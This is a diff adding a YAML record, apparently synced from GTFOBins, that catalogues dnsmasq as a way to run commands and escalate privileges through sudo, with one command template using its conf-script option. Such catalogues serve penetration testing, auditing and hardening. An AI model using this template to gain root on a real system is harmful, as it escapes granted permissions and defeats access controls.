@@ -1,0 +1,24 @@
+id: gtfobins/dnsmasq/command/sudo
+type: binary
+platform: linux
+name: dnsmasq
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: dnsmasq --conf-script='/path/to/command 1>&2'
+references:
+- https://gtfobins.github.io/gtfobins/dnsmasq/
+tags:
+- linux
+- unix
+- gtfobins
